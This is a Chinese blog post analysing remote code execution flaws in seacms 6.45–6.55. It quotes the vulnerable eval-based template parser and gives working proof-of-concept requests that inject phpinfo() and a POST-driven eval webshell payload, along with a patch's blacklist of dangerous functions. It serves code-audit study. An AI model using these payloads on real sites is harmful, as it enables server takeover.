<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"phyb0x.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="前言seacms从6.45开始到6.55一直存在命令执行，打了补丁也会被绕过。6.66在新的位置也爆出了代码执行……">
<meta property="og:type" content="article">
<meta property="og:title" content="seacms命令执行分析">
<meta property="og:url" content="https://phyb0x.github.io/2018/10/09/seacms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="p&#39;Blog">
<meta property="og:description" content="前言seacms从6.45开始到6.55一直存在命令执行，打了补丁也会被绕过。6.66在新的位置也爆出了代码执行……">
<meta property="og:locale">
<meta property="og:image" content="https://i.imgur.com/Ep4cQJb.png">
<meta property="article:published_time" content="2018-10-09T02:41:21.000Z">
<meta property="article:modified_time" content="2019-01-19T02:05:14.000Z">
<meta property="article:author" content="Yumi">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.imgur.com/Ep4cQJb.png">

<link rel="canonical" href="https://phyb0x.github.io/2018/10/09/seacms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh'
  };
</script>

  <title>seacms命令执行分析 | p'Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">p'Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="https://phyb0x.github.io/2018/10/09/seacms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/choumei.png">
      <meta itemprop="name" content="Yumi">
      <meta itemprop="description" content="Yumi">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="p'Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          seacms命令执行分析
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-10-09 10:41:21" itemprop="dateCreated datePublished" datetime="2018-10-09T10:41:21+08:00">2018-10-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-01-19 10:05:14" itemprop="dateModified" datetime="2019-01-19T10:05:14+08:00">2019-01-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>seacms从6.45开始到6.55一直存在命令执行，打了补丁也会被绕过。6.66在新的位置也爆出了代码执行……</p>
<span id="more"></span>

<p>找源码找了半天，最后终于找到了 哈哈 真心感谢这些项目的维护者</p>
<pre><code>https://github.com/SecWiki/CMS-Hunter 
</code></pre>
<h3 id="seacms-6-45"><a href="#seacms-6-45" class="headerlink" title="seacms 6.45"></a>seacms 6.45</h3><p>漏洞位置在/include/main.class.php  parseIf()这个函数</p>
<pre><code>    function parseIf($content)&#123;
        if (strpos($content,&#39;&#123;if:&#39;)=== false)&#123;
        return $content;
        &#125;else&#123;
        $labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);//匹配
        $labelRule2=&quot;&#123;elseif&quot;;
        $labelRule3=&quot;&#123;else&#125;&quot;;
        preg_match_all($labelRule,$content,$iar);//把匹配到赋值给iar
        $arlen=count($iar[0]);
        $elseIfFlag=false;
        for($m=0;$m&lt;$arlen;$m++)&#123;
            $strIf=$iar[1][$m];
            $strIf=$this-&gt;parseStrIf($strIf);
            $strThen=$iar[2][$m];
            $strThen=$this-&gt;parseSubIf($strThen);
            if (strpos($strThen,$labelRule2)===false)&#123;
                if (strpos($strThen,$labelRule3)&gt;=0)&#123;
                    $elsearray=explode($labelRule3,$strThen);
                    $strThen1=$elsearray[0];
                    $strElse1=$elsearray[1];
                    @eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);
                    if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125;
                &#125;else&#123;
                @eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);
</code></pre>
<p>实际上也是没进行过滤就传入eval导致的代码执行。其实主要关键点就是</p>
<pre><code>@eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);
</code></pre>
<p>可以看到这边<code>eval</code>的是<code>$strIf</code>，而<code>$strIf=$iar[1][$m];</code> 都是<code>$content</code> 这个参数匹配进去的。现在我们找那个地方会调用这个地方就行了。</p>
<p>search.php 文件</p>
<pre><code>function echoSearchPage()
&#123;
    global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;
    $order = !empty($order)?$order:time;
    if(intval($searchtype)==5)
    &#123;
        $searchTemplatePath = &quot;/templets/&quot;.$GLOBALS[&#39;cfg_df_style&#39;].&quot;/&quot;.$GLOBALS[&#39;cfg_df_html&#39;].&quot;/cascade.html&quot;;
        $typeStr = !empty($tid)?intval($tid).&#39;_&#39;:&#39;0_&#39;;
        $yearStr = !empty($year)?PinYin($year).&#39;_&#39;:&#39;0_&#39;;
        $letterStr = !empty($letter)?$letter.&#39;_&#39;:&#39;0_&#39;;
        $areaStr = !empty($area)?PinYin($area).&#39;_&#39;:&#39;0_&#39;;
        $orderStr = !empty($order)?$order.&#39;_&#39;:&#39;0_&#39;;
        $jqStr = !empty($jq)?$jq.&#39;_&#39;:&#39;0_&#39;;
        $cacheName=&quot;parse_cascade_&quot;.$typeStr.$yearStr.$letterStr.$areaStr.$orderStr;
        $pSize = getPageSizeOnCache($searchTemplatePath,&quot;cascade&quot;,&quot;&quot;);
    &#125;else
    &#123;
        if($cfg_search_time&amp;&amp;$page==1) checkSearchTimes($cfg_search_time);
        $searchTemplatePath = &quot;/templets/&quot;.$GLOBALS[&#39;cfg_df_style&#39;].&quot;/&quot;.$GLOBALS[&#39;cfg_df_html&#39;].&quot;/search.html&quot;;
        $cacheName=&quot;parse_search_&quot;;
        $pSize = getPageSizeOnCache($searchTemplatePath,&quot;search&quot;,&quot;&quot;);
    &#125;
    ...
    $content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content);
    $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content);
    $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content);
    $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);
    ...
    $content=replaceCurrentTypeId($content,-444);
    $content=$mainClassObj-&gt;parseIf($content);
    ...
</code></pre>
<p>我们要把$order赋值给$pSize选择模板文件，$order可以覆盖可控，之后用order变量替换了模板中的{searchpage:ordername}</p>
<pre><code>&lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#125;&#123;end if&#125;&#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;最新上映&lt;/a&gt;
&lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#125;&#123;end if&#125;&#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;最近热播&lt;/a&gt;
&lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#125;&#123;end if&#125;&#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;评分最高&lt;/a&gt;
</code></pre>
<p>然后传入parself</p>
<pre><code>evil(&quot;if(1)phpinfo();if(1)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);
</code></pre>
<p>最终poc </p>
<pre><code>http://127.0.0.1/seacms/seacms6.45/search.php?searchtype=5
post:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;
</code></pre>
<p><img src="https://i.imgur.com/Ep4cQJb.png"></p>
<h3 id="seacms-6-54"><a href="#seacms-6-54" class="headerlink" title="seacms 6.54"></a>seacms 6.54</h3><p>看补丁对order做了白名单限制，但是对漏洞根本原因并没有进行修复</p>
<pre><code>$orderarr=array(&#39;id&#39;,&#39;idasc&#39;,&#39;time&#39;,&#39;timeasc&#39;,&#39;hit&#39;,&#39;hitasc&#39;,&#39;commend&#39;,&#39;commendasc&#39;,&#39;score&#39;,&#39;scoreasc&#39;); if(!(in_array($order,$orderarr)))&#123;$order=&#39;time&#39;;&#125;
</code></pre>
<p>看大佬们给的poc (大佬就是牛逼！)</p>
<pre><code>get:http://seacms.test/search.php
POST: searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();
</code></pre>
<p>我们可以看到即使限制了$order还有其他变量可以覆盖，但是对利用进行了一些限制。进行了过滤并且限制20个字符。</p>
<pre><code>$searchword = RemoveXSS(stripslashes($searchword));
$searchword = addslashes(cn_substr($searchword,20));
$searchword = trim($searchword);
$jq = RemoveXSS(stripslashes($jq));
$jq = addslashes(cn_substr($jq,20));
$area = RemoveXSS(stripslashes($area));
$area = addslashes(cn_substr($area,20));
$year = RemoveXSS(stripslashes($year));
$year = addslashes(cn_substr($year,20));
$yuyan = RemoveXSS(stripslashes($yuyan));
$yuyan = addslashes(cn_substr($yuyan,20));
$letter = RemoveXSS(stripslashes($letter));
$letter = addslashes(cn_substr($letter,20));
$state = RemoveXSS(stripslashes($state));
$state = addslashes(cn_substr($state,20));
$ver = RemoveXSS(stripslashes($ver));
$ver = addslashes(cn_substr($ver,20));
$money = RemoveXSS(stripslashes($money));
$money = addslashes(cn_substr($money,20));
$order = RemoveXSS(stripslashes($order));
$order = addslashes(cn_substr($order,20));
</code></pre>
<p>还是在<code>echoSearchPage</code>函数中</p>
<pre><code>if(intval($searchtype)==5)
&#123;
    $tname = !empty($tid)?getTypeNameOnCache($tid):&#39;全部&#39;;
    $jq = !empty($jq)?$jq:&#39;全部&#39;;
    $area = !empty($area)?$area:&#39;全部&#39;;
    $year = !empty($year)?$year:&#39;全部&#39;;
    $yuyan = !empty($yuyan)?$yuyan:&#39;全部&#39;;
    $letter = !empty($letter)?$letter:&#39;全部&#39;;
    $state = !empty($state)?$state:&#39;全部&#39;;
    $ver = !empty($ver)?$ver:&#39;全部&#39;;
    $money = !empty($money)?$money:&#39;全部&#39;;
    $content = str_replace(&quot;&#123;searchpage:type&#125;&quot;,$tid,$content);
    $content = str_replace(&quot;&#123;searchpage:typename&#125;&quot;,$tname ,$content);
    $content = str_replace(&quot;&#123;searchpage:year&#125;&quot;,$year,$content);
    $content = str_replace(&quot;&#123;searchpage:area&#125;&quot;,$area,$content);
    $content = str_replace(&quot;&#123;searchpage:letter&#125;&quot;,$letter,$content);
    $content = str_replace(&quot;&#123;searchpage:lang&#125;&quot;,$yuyan,$content);
    $content = str_replace(&quot;&#123;searchpage:jq&#125;&quot;,$jq,$content);
    if($state==&#39;w&#39;)&#123;$state2=&quot;完结&quot;;&#125;elseif($state==&#39;l&#39;)&#123;$state2=&quot;连载中&quot;;&#125;else&#123;$state2=&quot;全部&quot;;&#125;
    if($money==&#39;m&#39;)&#123;$money2=&quot;免费&quot;;&#125;elseif($money==&#39;s&#39;)&#123;$money2=&quot;收费&quot;;&#125;else&#123;$money2=&quot;全部&quot;;&#125;
    $content = str_replace(&quot;&#123;searchpage:state&#125;&quot;,$state2,$content);
    $content = str_replace(&quot;&#123;searchpage:money&#125;&quot;,$money2,$content);
    $content = str_replace(&quot;&#123;searchpage:ver&#125;&quot;,$ver,$content);
    $content=$mainClassObj-&gt;parsePageList($content,&quot;&quot;,$page,$pCount,$TotalResult,&quot;cascade&quot;);
    $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;type&quot;);
    $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;year&quot;);
    $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;area&quot;);
    $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;letter&quot;);
    $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;lang&quot;);
    $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;jq&quot;);
    $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;state&quot;);
    $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;ver&quot;);
    $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;money&quot;);
&#125;
</code></pre>
<p>替换流程：</p>
<pre><code>Step 0:       &lt;meta name=&quot;keywords&quot; content=&quot;&#123;seacms:searchword&#125;,海洋CMS&quot; /&gt;
Step 1:       &lt;meta name=&quot;keywords&quot; content=&quot;&#123;if&#123;searchpage:year&#125;,海洋CMS&quot; /&gt;
Step 2:     &lt;meta name=&quot;keywords&quot; content=&quot;&#123;if:e&#123;searchpage:area&#125;&#125;,海洋CMS&quot; /&gt;
Step3:       &lt;meta name=&quot;keywords&quot; content=&quot;&#123;if:ev&#123;searchpage:letter&#125;&#125;,海洋CMS&quot; /&gt;
Step4:       &lt;meta name=&quot;keywords&quot; content=&quot;&#123;if:eval&#123;searchpage:lang&#125;&#125;,海洋CMS&quot; /&gt;
Step5:       &lt;meta name=&quot;keywords&quot; content=&quot;&#123;if:eval(join&#123;searchpage:jq&#125;),海洋CMS&quot; /&gt;
Step6:       &lt;meta name=&quot;keywords&quot; content=&quot;&#123;if:eval(join($_P&#123;searchpage:ver&#125;),海洋CMS&quot; /&gt;
Step7:       &lt;meta name=&quot;keywords&quot; content=&quot;&#123;if:eval(join($_POST[9]))&#125;,海洋CMS&quot; /&gt;
</code></pre>
<p>可以看到已经替换成我们的木马然后在匹配到parseIf去eval。</p>
<h3 id="seacms-6-55"><a href="#seacms-6-55" class="headerlink" title="seacms 6.55"></a>seacms 6.55</h3><p>看补丁 </p>
<pre><code> function parseIf($content)&#123;
            if (strpos($content,&#39;&#123;if:&#39;)=== false)&#123;
            return $content;
            &#125;else&#123;
            $labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);
            $labelRule2=&quot;&#123;elseif&quot;;
            $labelRule3=&quot;&#123;else&#125;&quot;;
            preg_match_all($labelRule,$content,$iar);
    foreach($iar as $v)&#123;
        $iarok[] = str_replace(array(&#39;unlink&#39;,&#39;opendir&#39;,&#39;mysqli_&#39;,&#39;mysql_&#39;,&#39;socket_&#39;,&#39;curl_&#39;,&#39;base64_&#39;,&#39;putenv&#39;,&#39;popen(&#39;,&#39;phpinfo&#39;,&#39;pfsockopen&#39;,&#39;proc_&#39;,&#39;preg_&#39;,&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;,&#39;_REQUEST&#39;,&#39;_SESSION&#39;,&#39;eval(&#39;,&#39;file_&#39;,&#39;passthru(&#39;,&#39;exec(&#39;,&#39;system(&#39;,&#39;shell_&#39;), &#39;@.@&#39;, $v);
    &#125;
    $iar = $iarok;  
</code></pre>
<p>这里对<code>$iar[]</code>黑名单过滤，这里看大佬分析是用$_SERVER引入请求</p>
<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/150303.html">http://www.freebuf.com/vuls/150303.html</a><br>直接看大佬分析吧(评论也是很好笑的)</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2018/10/08/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%BB%AD/" rel="prev" title="phpcms漏洞分析续">
      <i class="fa fa-chevron-left"></i> phpcms漏洞分析续
    </a></div>
      <div class="post-nav-item">
    <a href="/2018/10/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" rel="next" title="redis未授权访问">
      redis未授权访问 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seacms-6-45"><span class="nav-number">2.</span> <span class="nav-text">seacms 6.45</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seacms-6-54"><span class="nav-number">3.</span> <span class="nav-text">seacms 6.54</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seacms-6-55"><span class="nav-number">4.</span> <span class="nav-text">seacms 6.55</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Yumi"
      src="/images/choumei.png">
  <p class="site-author-name" itemprop="name">Yumi</p>
  <div class="site-description" itemprop="description">Yumi</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">29</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">categories</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yumi</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
